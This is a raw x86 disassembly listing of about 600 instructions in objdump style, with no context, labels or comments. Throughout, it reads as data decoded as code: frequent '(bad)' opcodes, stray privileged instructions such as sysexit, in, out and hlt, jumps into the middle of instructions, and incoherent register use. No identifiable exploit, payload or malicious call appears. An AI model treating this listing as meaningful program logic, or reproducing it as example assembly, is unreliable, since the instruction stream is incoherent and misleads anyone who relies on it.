  429cf7:	mov    BYTE PTR [ebx-0x34b20729],cl
  429cfd:	mov    edx,ebx
  429cff:	lock (bad) 
  429d01:	ror    esi,cl
  429d03:	push   ebp
  429d04:	scas   eax,DWORD PTR es:[edi]
  429d05:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  429d0b:	sahf   
  429d0c:	sub    esi,DWORD PTR [edx]
  429d0e:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  429d14:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429d15:	xor    esp,DWORD PTR [ebx]
  429d17:	add    ecx,DWORD PTR [ebp-0x1c]
  429d1a:	mov    edi,DWORD PTR [ebp-0x8]
  429d1d:	mov    bl,cl
  429d1f:	cmp    dl,bl
  429d21:	jb     0x429cf1
  429d23:	add    dh,dl
  429d25:	dec    ebp
  429d26:	scas   eax,DWORD PTR es:[edi]
  429d27:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  429d2d:	shr    DWORD PTR [ebx],cl
  429d2f:	into   
  429d30:	cmp    edx,esi
  429d32:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  429d38:	dec    ebp
  429d39:	dec    ebp
  429d3a:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  429d40:	retf   
  429d41:	xor    edx,esi
  429d43:	add    ecx,esi
  429d45:	imul   ecx,edx
  429d48:	mov    DWORD PTR [ebp+0x8],edx
  429d4b:	xor    ecx,DWORD PTR [ebp+0x2b]
  429d4e:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  429d54:	add    esi,DWORD PTR [ebx]
  429d56:	rol    BYTE PTR [ebx],0x45
  429d59:	sysexit 
  429d5b:	xlat   BYTE PTR ds:[ebx]
  429d5c:	pushf  
  429d5d:	jge    0x429ce8
  429d5f:	xor    esp,eax
  429d61:	sub    eax,DWORD PTR [ebp-0x73]
  429d64:	(bad)  
  429d65:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  429d6c:	dec    ebp
  429d6d:	xchg   BYTE PTR [ebx],dh
  429d6f:	inc    DWORD PTR [ebx]
  429d71:	(bad)  
  429d72:	jmp    0x429dc1
  429d74:	mov    ecx,DWORD PTR [ebx-0x34341324]
  429d7a:	dec    ebp
  429d7b:	into   
  429d7c:	mov    ebp,DWORD PTR [edi-0x23737420]
  429d82:	sahf   
  429d83:	shl    DWORD PTR [edx],cl
  429d85:	retf   0x5588
  429d88:	or     ecx,DWORD PTR [ebp+0x7233114d]
  429d8e:	add    eax,DWORD PTR [eax]
  429d90:	in     al,0x4d
  429d92:	push   ebp
  429d93:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  429d99:	bound  eax,QWORD PTR [eax]
  429d9b:	int    0x4d
  429d9d:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  429da3:	dec    ebp
  429da4:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  429daa:	jge    0x429d7a
  429dac:	mov    BYTE PTR [edi+0xf723b3a],ch
  429db2:	add    cl,dh
  429db4:	dec    ebp
  429db5:	dec    DWORD PTR [ebx-0x2c032301]
  429dbb:	inc    ebp
  429dbc:	push   ebp
  429dbd:	dec    DWORD PTR [ebx-0x73ff1f34]
  429dc3:	lea    ebx,[esi-0x7400cdac]
  429dc9:	push   eax
  429dca:	mov    ah,0x45
  429dcc:	push   ebp
  429dcd:	mov    esi,DWORD PTR [ebx]
  429dcf:	les    esi,FWORD PTR [ebx]
  429dd1:	add    BYTE PTR [ebx],al
  429dd3:	inc    DWORD PTR [ebx]
  429dd5:	mov    ecx,DWORD PTR [edi]
  429dd7:	cld    
  429dd8:	retf   0x4d80
  429ddb:	add    DWORD PTR [ecx+0x4d30e400],ecx
  429de1:	jne    0x429d6e
  429de3:	(bad)  
  429de4:	in     al,dx
  429de5:	ror    bl,1
  429de7:	clc    
  429de8:	into   
  429de9:	add    BYTE PTR [edi-0xf2f7475],ch
  429def:	not    bl
  429df1:	adc    al,0xca
  429df3:	inc    ebp
  429df4:	push   ebp
  429df5:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  429dfb:	push   0xaf80d6
  429e00:	mov    eax,DWORD PTR [eax]
  429e02:	fdiv   st(7),st
  429e04:	sti    
  429e05:	sbb    dh,cl
  429e07:	pop    esi
  429e08:	xchg   esp,eax
  429e09:	leave  
  429e0a:	sahf   
  429e0b:	add    al,0x32
  429e0d:	push   ebp
  429e0e:	cmp    ebp,esp
  429e10:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  429e14:	dec    DWORD PTR [ecx-0x740f0375]
  429e1a:	push   ebp
  429e1b:	cld    
  429e1c:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  429e22:	retf   0x558b
  429e25:	clc    
  429e26:	xor    esi,eax
  429e28:	add    esi,DWORD PTR [ebp-0x75]
  429e2b:	(bad)  
  429e2c:	hlt    
  429e2d:	or     cl,BYTE PTR [esi+eax*8-0x39cdf762]
  429e34:	mov    DWORD PTR [edx],ecx
  429e36:	hlt    
  429e37:	(bad)  
  429e38:	dec    ebp
  429e39:	add    dh,BYTE PTR [ebx]
  429e3b:	leave  
  429e3c:	mov    edx,0xffec8d55
  429e41:	push   ecx
  429e42:	rol    DWORD PTR [ebp+0x55],1
  429e45:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  429e4b:	mov    eax,0xf8030b33
  429e50:	lar    ecx,di
  429e53:	push   ebp
  429e54:	retf   0x863b
  429e57:	jne    0x429e56
  429e59:	mov    edi,edi
  429e5b:	or     BYTE PTR [ebp+0x41],dh
  429e5e:	mov    esp,eax
  429e60:	cld    
  429e61:	inc    eax
  429e62:	mov    al,0x29
  429e64:	add    DWORD PTR [ecx+0x0],eax
  429e67:	loope  0x429dee
  429e69:	inc    ecx
  429e6a:	call   eax
  429e6c:	inc    edx
  429e6e:	mov    eax,DWORD PTR [eax]
  429e70:	cld    
  429e71:	mov    eax,DWORD PTR [eax+0x8d0151]
  429e77:	clc    
  429e78:	xor    BYTE PTR [ebp+0x45],al
  429e7b:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  429e81:	loopne 0x429e82
  429e83:	mov    edi,edi
  429e85:	mov    ecx,eax
  429e87:	clc    
  429e88:	jne    0x429e5a
  429e8a:	call   0x83af93
  429e8f:	sub    DWORD PTR [ebp+0x45],esi
  429e92:	test   esi,eax
  429e94:	je     0x429e97
  429e96:	mov    eax,esi
  429e98:	cld    
  429e99:	or     DWORD PTR [eax+0x401c9],eax
  429e9f:	push   ebp
  429ea0:	add    ah,ch
  429ea2:	add    BYTE PTR [ecx+0x6a],dl
  429ea5:	inc    ebp
  429ea6:	push   esi
  429ea7:	mov    DWORD PTR [eax-0x4],edx
  429eaa:	pop    edi
  429eab:	mov    ebx,DWORD PTR [ebx-0x4]
  429eae:	ret    0xbe
  429eb1:	push   es
  429eb2:	mov    ecx,DWORD PTR [ecx-0x77274af]
  429eb8:	clc    
  429eb9:	lock inc ebp
  429ebb:	jne    0x429f13
  429ebd:	(bad)  
  429ebe:	jne    0x429ec4
  429ec0:	mov    eax,0xf841ba66
  429ec5:	rol    BYTE PTR [esi],1
  429ec7:	(bad)  
  429ec8:	jne    0x429efb
  429eca:	cmp    eax,ebx
  429ecc:	pop    esi
  429ecd:	mov    ecx,DWORD PTR [eax]
  429ecf:	push   ecx
  429ed0:	inc    ecx
  429ed1:	lea    edi,[eax+edi*8+0x42]
  429ed5:	inc    ebp
  429ed6:	ror    DWORD PTR [ebx-0x408303be],0x41
  429edd:	xchg   edx,ebp
  429edf:	mov    ebx,eax
  429ee1:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  429ee7:	or     edi,eax
  429ee9:	inc    ebp
  429eea:	inc    ebp
  429eeb:	(bad)  
  429eec:	mov    ecx,DWORD PTR [eax]
  429eee:	cld    
  429eef:	(bad)  
  429ef0:	jmp    0x429ef3
  429ef2:	mov    eax,esi
  429ef4:	mov    DWORD PTR ds:0x4f8c98b,eax
  429efa:	rcl    BYTE PTR [esi+0xf],1
  429efd:	iret   
  429efe:	inc    ebp
  429eff:	leave  
  429f00:	(bad)  
  429f01:	dec    DWORD PTR [ecx]
  429f03:	mov    eax,esi
  429f05:	mov    eax,DWORD PTR [edi]
  429f07:	mov    dh,0xd1
  429f0a:	push   es
  429f0b:	nop
  429f0c:	(bad)  
  429f0d:	inc    DWORD PTR [ebx]
  429f0f:	push   esi
  429f10:	leave  
  429f11:	iret   
  429f12:	add    al,0x46
  429f14:	push   ebp
  429f15:	in     eax,0xec
  429f17:	push   ebp
  429f18:	push   ecx
  429f19:	inc    DWORD PTR [ebp+0x56]
  429f1c:	mov    DWORD PTR [esi-0x4],eax
  429f1f:	loope  0x429f76
  429f21:	sbb    BYTE PTR [eax+0x7c6daff],bh
  429f27:	add    al,BYTE PTR [edx]
  429f29:	mov    edx,DWORD PTR [ebp-0x17]
  429f2c:	cmp    edi,esi
  429f2e:	jne    0x429f2f
  429f30:	(bad)  
  429f31:	push   esi
  429f32:	pop    es
  429f33:	push   ebp
  429f34:	mov    ebp,esp
  429f36:	or     BYTE PTR [ebp+0x41],al
  429f39:	add    edi,edx
  429f3b:	sub    BYTE PTR [eax-0x4],al
  429f3e:	shl    BYTE PTR [ebp-0x3e],0x1
  429f42:	add    BYTE PTR [ebx+ecx*4],bl
  429f45:	mov    edx,DWORD PTR [ecx+0x14]
  429f48:	lea    edx,[edx-0x1ba7508]
  429f4e:	push   esi
  429f4f:	enter  0xd375,0xb8
  429f53:	test   DWORD PTR [esi],0x6ce0750
  429f59:	enter  0xd375,0x3b
  429f5d:	neg    DWORD PTR [esi+0x50]
  429f60:	or     cl,dl
  429f62:	inc    edx
  429f63:	(bad)  
  429f64:	in     eax,dx
  429f65:	in     al,dx
  429f66:	(bad)  
  429f67:	sub    eax,DWORD PTR [ebx]
  429f69:	inc    eax
  429f6a:	in     eax,dx
  429f6b:	push   eax
  429f6c:	add    dl,BYTE PTR [eax-0x37]
  429f6f:	push   edi
  429f70:	push   ebp
  429f71:	imul   ah
  429f73:	adc    DWORD PTR [ecx-0x1],0x45
  429f77:	add    BYTE PTR [ecx+0x55d3fc00],cl
  429f7d:	lea    edi,[eax-0x7fff4ca]
  429f83:	mov    eax,0x4550402
  429f88:	cmp    ebp,ecx
  429f8a:	jne    0x429f37
  429f8c:	mov    eax,DWORD PTR ds:0x241e808
  429f92:	loope  0x429f94
  429f94:	inc    eax
  429f95:	stc    
  429f96:	xlat   BYTE PTR ds:[ebx]
  429f97:	ss inc ecx
  429f99:	aas    
  429f9a:	in     eax,0x7d
  429f9c:	ret    0x8b
  429f9f:	lock mov edi,DWORD PTR [ebp-0x18]
  429fa3:	and    edi,edi
  429fa5:	mov    edi,edi
  429fa7:	call   0xe410a083
  429fac:	push   es
  429fad:	add    al,ch
  429faf:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  429fb6:	(bad)  
  429fb7:	hlt    
  429fb8:	add    eax,0xffd3e87d
  429fbd:	cmp    bh,0x8
  429fc0:	(bad)  
  429fc1:	fld    DWORD PTR [esi]
  429fc3:	out    dx,al
  429fc4:	call   0xffa19ecc
  429fc9:	cmp    al,0x46
  429fcb:	shr    edx,0x8
  429fce:	(bad)  
  429fcf:	pop    es
  429fd0:	fisttp QWORD PTR [ebp+0xe577eff]
  429fd6:	push   ebx
  429fd7:	add    BYTE PTR [ebx+0x24008b56],cl
  429fdd:	add    BYTE PTR [ebp+0x50],al
  429fe0:	push   eax
  429fe1:	add    DWORD PTR [ebx+0x757d1834],ecx
  429fe7:	sub    edx,DWORD PTR [esi-0x24]
  429fea:	jne    0x429fa2
  429fec:	lods   eax,DWORD PTR ds:[esi]
  429fed:	mov    edx,DWORD PTR [edx-0x34]
  429ff0:	dec    esi
  429ff1:	out    0x83,eax
  429ff3:	into   
  429ff4:	push   edi
  429ff6:	loopne 0x429fc6
  429ff8:	shr    BYTE PTR [edx+ecx*4+0x0],1
  429ffc:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  42a003:	rol    DWORD PTR [edx],0x8
  42a006:	mov    esp,ecx
  42a008:	cmp    DWORD PTR [ebx],0xc
  42a00b:	mov    esi,0x5001c0
  42a010:	push   eax
  42a011:	push   cs
  42a012:	push   eax
  42a013:	(bad)  
  42a014:	sub    edx,edi
  42a016:	push   esi
  42a017:	adc    al,0xcb
  42a019:	ins    DWORD PTR es:[edi],dx
  42a01a:	mov    eax,0x203e8
  42a01f:	add    al,ah
  42a021:	inc    esi
  42a022:	mov    al,ch
  42a024:	pop    es
  42a025:	add    DWORD PTR [eax],0x1
  42a028:	add    dh,al
  42a02a:	add    ah,ch
  42a02c:	rol    DWORD PTR [edx-0xd],1
  42a02f:	cli    
  42a030:	push   0x4a
  42a032:	pop    ecx
  42a033:	retf   0xfe6
  42a036:	add    BYTE PTR [ebx-0x4e72f41e],al
  42a03c:	(bad)  
  42a03d:	dec    BYTE PTR [ebx+0x45b1fc72]
  42a043:	(bad)  
  42a044:	sub    ebp,DWORD PTR [ebx]
  42a046:	and    al,0x52
  42a048:	(bad)  
  42a049:	dec    edi
  42a04a:	inc    ebp
  42a04b:	shl    DWORD PTR [eax+0x24fe8c8],0x0
  42a052:	add    BYTE PTR [ebp-0x7b],dh
  42a055:	pop    eax
  42a056:	add    BYTE PTR [edx+0x0],bl
  42a059:	pop    edx
  42a05a:	dec    ebp
  42a05b:	jmp    DWORD PTR [ebx]
  42a05d:	and    al,0xec
  42a05f:	push   edx
  42a060:	out    0x64,eax
  42a062:	jmp    0xd3f49667
  42a067:	jmp    0x42a0c1
  42a069:	mov    al,0xfe
  42a06b:	dec    BYTE PTR [ebp-0x18fd8018]
  42a071:	add    BYTE PTR [esi+ebp*1],bh
  42a074:	pop    edx
  42a075:	icebp  
  42a076:	mov    eax,cs
  42a078:	ins    BYTE PTR es:[edi],dx
  42a079:	adc    eax,0x75510000
  42a07e:	mov    esi,0x70158
  42a083:	or     DWORD PTR [eax-0x74f48dfe],esi
  42a089:	mov    edi,esp
  42a08b:	cld    
  42a08c:	jge    0x42a103
  42a08e:	(bad)  
  42a090:	aas    
  42a091:	and    al,0x6d
  42a093:	adc    cl,0x1
  42a096:	mov    eax,DWORD PTR [eax]
  42a098:	and    ecx,DWORD PTR [ebx-0x167203fd]
  42a09e:	dec    ebp
  42a09f:	add    eax,ebp
  42a0a1:	add    BYTE PTR [edx],al
  42a0a3:	fadd   DWORD PTR [eax]
  42a0a5:	stc    
  42a0a6:	enter  0xee00,0x8b
  42a0aa:	sbb    eax,0x1
  42a0ad:	sbb    esi,ecx
  42a0af:	in     al,0x0
  42a0b1:	in     eax,dx
  42a0b2:	add    BYTE PTR [eax],al
  42a0b4:	jne    0x42a041
  42a0b6:	cmp    edx,esp
  42a0b8:	jb     0x42a0c3
  42a0ba:	jmp    0x42a131
  42a0bc:	mov    ecx,DWORD PTR [ebx+0x4d91d4cc]
  42a0c2:	add    BYTE PTR [ebx+0x4d83d840],cl
  42a0c8:	add    DWORD PTR [ebx+0x4d3bdcee],ecx
  42a0ce:	jb     0x42a059
  42a0d0:	pop    edx
  42a0d1:	fadd   QWORD PTR [ebx-0x7445faa1]
  42a0d7:	or     dh,BYTE PTR [edx+0x0]
  42a0da:	inc    edx
  42a0db:	or     dl,bh
  42a0dd:	xlat   BYTE PTR ds:[ebx]
  42a0de:	dec    edx
  42a0df:	push   edi
  42a0e0:	add    al,0x7
  42a0e2:	leave  
  42a0e3:	rol    DWORD PTR [edx+eax*1],0x7
  42a0e7:	add    ecx,ecx
  42a0e9:	mov    edx,ecx
  42a0eb:	int3   
  42a0ec:	jmp    0x42a0ac
  42a0ee:	mov    al,0x0
  42a0f0:	(bad)  
  42a0f1:	jne    0x42a0db
  42a0f3:	mov    eax,DWORD PTR [edx]
  42a0f5:	call   0xc1571dfa
  42a0fa:	pop    edi
  42a0fb:	add    ebx,DWORD PTR [ecx-0x37]
  42a0fe:	pop    ecx
  42a0ff:	or     BYTE PTR [ecx*4-0x1445b8af],dh
  42a106:	push   es
  42a107:	mov    eax,DWORD PTR [eax]
  42a109:	int3   
  42a10a:	add    ch,al
  42a10c:	jae    0x42a0f6
  42a10e:	int    0x1
  42a110:	enter  0x3000,0x18
  42a114:	add    BYTE PTR [ebp+0x75],al
  42a117:	mov    esi,DWORD PTR [eax-0x171f0134]
  42a11d:	push   0x2
  42a11f:	pop    ecx
  42a120:	add    BYTE PTR [eax],cl
  42a122:	push   ebx
  42a123:	lea    edi,[edi+eax*2]
  42a126:	mov    al,0x1
  42a128:	jb     0x42a12a
  42a12a:	mov    al,0x10
  42a12c:	push   eax
  42a12d:	add    al,0x75
  42a12f:	add    BYTE PTR [ebx],ch
  42a131:	add    ebx,esp
  42a133:	int3   
  42a134:	jne    0x42a146
  42a136:	movsx  edx,cl
  42a139:	add    DWORD PTR [eax],eax
  42a13b:	add    BYTE PTR [ebp+ecx*2+0x40aa2b7d],ch
  42a142:	mov    gs,edi
  42a144:	add    BYTE PTR [eax-0x50],ch
  42a147:	add    al,ch
  42a149:	mov    eax,DWORD PTR [ecx]
  42a14b:	sub    eax,DWORD PTR [eax]
  42a14d:	jb     0x42a1c4
  42a14f:	add    DWORD PTR [esp+eiz*8-0x50],esi
  42a153:	jge    0x42a13d
  42a155:	add    al,0x1
  42a157:	add    DWORD PTR [eax],0x0
  42a15a:	jne    0x42a15c
  42a15c:	je     0x42a1a3
  42a15e:	mov    eax,DWORD PTR [edi]
  42a160:	ror    BYTE PTR [ebp+0x4d],1
  42a163:	or     DWORD PTR [ecx+0x4d03d004],0x3
  42a16a:	mov    DWORD PTR [ebx-0x1eb2372c],ecx
  42a170:	mov    DWORD PTR [ebx],ebp
  42a172:	fadd   DWORD PTR [eax+0x75]
  42a175:	inc    eax
  42a176:	pop    eax
  42a177:	lea    ebx,[ecx+0x4f]
  42a17a:	push   0xb1000003
  42a17f:	out    dx,eax
  42a180:	add    ebp,DWORD PTR [edx+edx*2]
  42a183:	add    BYTE PTR [ebx+ecx*4],bh
  42a186:	mov    ch,BYTE PTR [ebx]
  42a188:	jb     0x42a1fc
  42a18a:	add    al,0x89
  42a18c:	push   eax
  42a18d:	call   0x842aeeff
  42a192:	add    DWORD PTR [eax+eax*1],eax
  42a195:	jae    0x42a1ab
  42a197:	icebp  
  42a198:	inc    ebp
  42a199:	mov    eax,DWORD PTR gs:[ecx]
  42a19c:	int3   
  42a19d:	out    dx,al
  42a19e:	loopne 0x42a1ed
  42a1a0:	sub    eax,DWORD PTR [edx]
  42a1a2:	push   0xffffff83
  42a1a4:	pop    esi
  42a1a5:	push   cs
  42a1a6:	jl     0x42a1c1
  42a1a8:	add    al,0xaf
  42a1aa:	xor    eax,0x832b6d00
  42a1af:	mov    eax,DWORD PTR [edx]
  42a1b1:	rcr    BYTE PTR [ebp+0x754500dc],cl
  42a1b7:	ror    DWORD PTR [ebx+0x7dc8e803],1
  42a1bd:	inc    ebp
  42a1be:	shr    ebx,0x3
  42a1c1:	or     DWORD PTR [eax],0x4
  42a1c4:	push   0xffffffa5
  42a1c6:	pop    esi
  42a1c7:	add    BYTE PTR [ecx+edx*8-0x23ff2efc],bh
  42a1ce:	jmp    0x42a22d
  42a1d0:	mov    edi,0xff0272
  42a1d5:	fdivr  QWORD PTR [ebp+0x5d]
  42a1d8:	push   0x4e
  42a1da:	pop    ecx
  42a1db:	call   0x42e5e0
  42a1e0:	mov    DWORD PTR [ebx],eax
  42a1e2:	in     al,0xc8
  42a1e4:	rol    BYTE PTR [ebp-0x75],0xc1
  42a1e8:	call   0xaca3c9
  42a1ed:	pop    esi
  42a1ee:	enter  0xceff,0x8b
  42a1f2:	repz mov ecx,DWORD PTR [ebp-0x34]
  42a1f6:	xor    DWORD PTR [esi-0x57f0ff3c],0xffffffb0
  42a1fd:	je     0x42a1ff
  42a1ff:	or     DWORD PTR [ebx-0x74183b24],eax
  42a205:	jne    0x42a1eb
  42a207:	jmp    0x42a202
  42a209:	push   DWORD PTR [edx-0x24]
  42a20c:	push   0x4d
  42a20e:	pop    ecx
  42a20f:	cmp    DWORD PTR [ebp+0x2],0xffffffc1
  42a213:	jge    0x42a21b
  42a215:	mov    eax,eax
  42a217:	sub    ebp,DWORD PTR [edx+0x24]
  42a21a:	pop    esi
  42a21b:	inc    ebp
  42a21c:	mov    esp,0x8b6077
  42a221:	sub    ecx,DWORD PTR [ebx+0x155e8dc]
  42a227:	lods   al,BYTE PTR ds:[esi]
  42a228:	add    BYTE PTR [ebx],bh
  42a22a:	enter  0xce73,0x49
  42a22e:	repz test DWORD PTR [ebp+0x7d],0xf0dc0f89
  42a236:	stc    
  42a237:	jge    0x42a2ab
  42a239:	jnp    0xdd42259a
  42a23f:	call   0xc5a315
  42a244:	fadd   st(0),st
  42a246:	dec    esi
  42a247:	ins    BYTE PTR es:[edi],dx
  42a248:	stc    
  42a249:	cmp    al,0x73
  42a24b:	push   ebp
  42a24c:	mov    eax,0xf8028b
  42a251:	jne    0x42a214
  42a253:	mov    esi,ecx
  42a255:	mov    esp,DWORD PTR [ebp+0x2c]
  42a258:	add    edi,DWORD PTR [ebp-0x24]
  42a25b:	sub    esp,eax
  42a25d:	and    al,0x45
  42a25f:	cmp    cl,BYTE PTR [ecx+0x2d5fcc5b]
  42a265:	sbb    al,0xee
  42a267:	pop    esi
  42a268:	call   0x82a298
  42a26d:	fsubr  st,st(3)
  42a26f:	sti    
  42a270:	add    BYTE PTR gs:[ecx],bh
  42a273:	add    eax,esp
  42a275:	add    DWORD PTR [esi],eax
  42a277:	rol    DWORD PTR [ebp+0x8],0x29
  42a27b:	mov    esp,eax
  42a27d:	clc    
  42a27e:	jne    0x42a2f5
  42a280:	mov    eax,0x8b0673
  42a285:	loopne 0x42a2cc
  42a287:	loopne 0x42a212
  42a289:	lods   al,BYTE PTR ds:[esi]
  42a28a:	int3   
  42a28b:	inc    ebp
  42a28c:	mov    DWORD PTR gs:[eax+edi*8],eax
  42a290:	add    al,0xc3
  42a292:	sub    ecx,DWORD PTR [ebp+0x47]
  42a295:	(bad)  
  42a297:	shr    BYTE PTR [ebp-0x1f],0xe8
  42a29b:	add    eax,DWORD PTR [eax]
  42a29d:	call   0x64463a2
  42a2a2:	add    esi,DWORD PTR [esi-0x3b2efc83]
  42a2a8:	dec    esi
  42a2a9:	ins    DWORD PTR es:[edi],dx
  42a2aa:	in     al,dx
  42a2ab:	lea    eax,[eax]
  42a2ad:	inc    ebp
  42a2ae:	inc    ebp
  42a2af:	sub    ecx,DWORD PTR [ebx-0x3eba1b73]
  42a2b5:	or     DWORD PTR [ebx-0x38ff0400],0x398b4573
  42a2bf:	and    al,0xdc
  42a2c1:	ror    DWORD PTR [edx+0x24],0xf7
  42a2c5:	or     BYTE PTR [ebp+0x4c],dh
  42a2c8:	mov    ebx,DWORD PTR [eax+ebp*1-0x64]
  42a2cc:	stos   BYTE PTR es:[edi],al
  42a2cd:	adc    edx,edi
  42a2cf:	inc    esp
  42a2d0:	add    edi,DWORD PTR [eax]
  42a2d2:	jne    0x42a2b7
  42a2d4:	mov    DWORD PTR [eax-0x7449db04],ecx
  42a2da:	cmp    ecx,DWORD PTR [edi]
  42a2dc:	sub    BYTE PTR [ebp-0x7e],dl
  42a2df:	sar    ebp,0xb
  42a2e2:	jmp    FWORD PTR [edi+0x2400392a]
  42a2e8:	sub    esi,DWORD PTR [ebx-0x73]
  42a2eb:	mov    esp,DWORD PTR [ecx+edi*4]
  42a2ee:	mov    ecx,DWORD PTR [eax]
  42a2f0:	and    BYTE PTR [eax],al
  42a2f2:	jne    0x42a2be
  42a2f4:	sub    ebp,ecx
  42a2f6:	sbb    BYTE PTR [esi+0x32],ah
  42a2f9:	dec    ebp
  42a2fa:	push   ebp
  42a2fb:	add    ecx,DWORD PTR [ebx+0x7d24fc8d]
  42a301:	ret    
  42a302:	mov    edx,ebp
  42a304:	leave  
  42a305:	sub    DWORD PTR [esi+0x24],ebx
  42a308:	ret    0x2b
  42a30b:	pop    ax
  42a30d:	push   ebp
  42a30e:	rol    BYTE PTR [ebx],0xeb
  42a311:	add    DWORD PTR [ecx+0x6c0001],0x40
  42a318:	jb     0x42a36f
  42a31a:	ret    
  42a31b:	in     al,dx
  42a31c:	jecxz  0x42a2a9
  42a31e:	push   esi
  42a31f:	xchg   esp,eax
  42a320:	jne    0x42a322
  42a322:	cmp    edx,DWORD PTR [esi+0x1c]
  42a325:	jne    0x42a30b
  42a327:	mov    eax,DWORD PTR [ebp-0x77]
  42a32a:	ror    DWORD PTR [ebx+0x899408],0xe0
  42a331:	mov    esi,DWORD PTR [ebp-0x75]
  42a334:	pop    esi
  42a335:	nop
  42a336:	mov    eax,DWORD PTR [eax]
  42a338:	les    ecx,FWORD PTR [ecx-0x6b3e744a]
  42a33e:	add    al,0x0
  42a340:	inc    ebp
  42a341:	mov    eax,DWORD PTR [ebx]
  42a343:	mov    ebp,ebx
  42a345:	cmp    al,0xf
  42a347:	or     al,al
  42a349:	inc    ebp
  42a34a:	inc    ebp
  42a34b:	xor    eax,0x8bc89c8b
  42a350:	ins    BYTE PTR es:[edi],dx
  42a351:	cld    
  42a352:	add    BYTE PTR [edi+0x576c16c0],dh
  42a358:	add    BYTE PTR [ecx-0x5],dl
  42a35b:	add    eax,0x17200
  42a360:	sbb    al,0x85
  42a362:	dec    esp
  42a363:	je     0x42a39d
  42a365:	mov    esp,DWORD PTR [eax+ecx*8+0x20]
  42a369:	add    BYTE PTR [ebx],bh
  42a36b:	(bad)  
  42a36c:	and    al,0x34
  42a36e:	jae    0x42a30c
  42a370:	mov    cl,cl
  42a372:	inc    DWORD PTR [esp]
  42a375:	push   ebp
  42a376:	shr    esp,0x8
  42a379:	in     al,dx
  42a37a:	push   esp
  42a37b:	add    DWORD PTR [eax],esp
  42a37d:	add    bl,cl
  42a37f:	inc    ebp
  42a380:	mov    bh,0x53
  42a382:	add    BYTE PTR [ebp-0x17],al
  42a385:	push   esi
  42a386:	cmovne ecx,edx
  42a389:	xor    al,0x4c
  42a38b:	pushf  
  42a38c:	and    BYTE PTR [edi+0x17],dl
  42a38f:	xor    eax,0x89009cd9
  42a394:	add    ah,bh
  42a396:	sub    eax,DWORD PTR [ebp-0x3f]
  42a399:	aad    0x5
  42a39b:	inc    ebp
  42a39c:	add    eax,edx
  42a39e:	add    BYTE PTR [ebp-0x40],al
  42a3a1:	xlat   BYTE PTR ds:[ebx]
  42a3a2:	ins    BYTE PTR es:[edi],dx
  42a3a3:	inc    ebp
  42a3a4:	inc    eax
  42a3a5:	and    ecx,eax
  42a3a7:	dec    ecx
  42a3a8:	add    eax,0x202e4c45
  42a3ad:	inc    ebp
  42a3ae:	fnstcw WORD PTR [ecx+ebp*1-0x37]
  42a3b2:	add    BYTE PTR [esi+0xc000c0],bh
  42a3b8:	lea    eax,[esp-0x34]
  42a3bc:	ret    
  42a3bd:	mov    dh,0x8b
  42a3bf:	xor    edx,DWORD PTR [ecx+0x3]
  42a3c2:	mov    al,BYTE PTR [ecx+0x1]
  42a3c5:	sbb    BYTE PTR [eax],al
  42a3c7:	stc    
  42a3c8:	mov    esi,DWORD PTR [edx+0x8]
  42a3cb:	(bad)  
  42a3cc:	les    esi,FWORD PTR ss:[ecx]
  42a3cf:	(bad)  
  42a3d0:	mov    al,ch
  42a3d2:	add    esi,eax
  42a3d4:	add    dh,al
  42a3d6:	or     esi,eax
  42a3d8:	mov    dl,0xc7
  42a3da:	add    esi,eax
  42a3dc:	add    al,cl
  42a3de:	push   cs
  42a3df:	mov    BYTE PTR [edx+0xc601c9],0xca
  42a3e6:	or     BYTE PTR [ebx],dh
  42a3e8:	dec    ecx
  42a3e9:	lea    eax,[ebx]
  42a3eb:	or     eax,0x18fc0fc7
  42a3f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42a3f1:	(bad)  
  42a3f3:	fiadd  WORD PTR [ebp-0x78]
  42a3f6:	jae    0xed77ab45
  42a3fc:	or     BYTE PTR [ebp+0x7],al
  42a3ff:	loope  0x42a39f
  42a401:	inc    ebp
  42a402:	xor    dl,ah
  42a404:	pop    esi
  42a405:	inc    ebp
  42a406:	shr    eax,0xc
  42a409:	inc    ebp
  42a40a:	and    ch,0x1
  42a40d:	inc    ebp
  42a40e:	add    bh,bl
  42a410:	add    BYTE PTR [ebp-0x7b],al
  42a413:	in     al,dx
  42a414:	clc    
  42a415:	inc    ebp
  42a416:	ret    0xd7
  42a419:	inc    ebp
  42a41a:	mov    edi,DWORD PTR [ecx+eax*4-0x37]
  42a41e:	sub    al,0x44
  42a420:	add    BYTE PTR [ebx+ecx*4-0x76cce34a],bh
  42a427:	add    ebx,DWORD PTR [ecx+eax*2]
  42a42a:	(bad)  
  42a42b:	sbb    al,ah
  42a42d:	stc    
  42a42e:	test   DWORD PTR [edx-0x8],esi
  42a431:	lea    edi,[edi-0x7007aa4]
  42a437:	mov    DWORD PTR [ebp-0x24],edi
  42a43a:	(bad)  
  42a43b:	dec    ebp
  42a43c:	int3   
  42a43d:	mov    eax,0x71cdfcc6
  42a442:	mov    BYTE PTR [ecx],0xce
  42a445:	(bad)  
  42a446:	(bad)  
  42a447:	dec    edi
  42a449:	jmp    FWORD PTR [edx-0x38]
  42a44c:	(bad)  
  42a44d:	or     dl,al
  42a44f:	jge    0x42a417
  42a451:	(bad)  
  42a452:	shl    esp,1
  42a454:	xor    eax,DWORD PTR [ebp+0x45cbf85a]
  42a45a:	add    BYTE PTR [ebx+0xd8c8d],cl
  42a460:	rdpmc  
  42a462:	sbb    BYTE PTR [edi+0x7de08da],bh
  42a468:	mov    BYTE PTR [esi+0x39063283],bl
  42a46e:	in     eax,dx
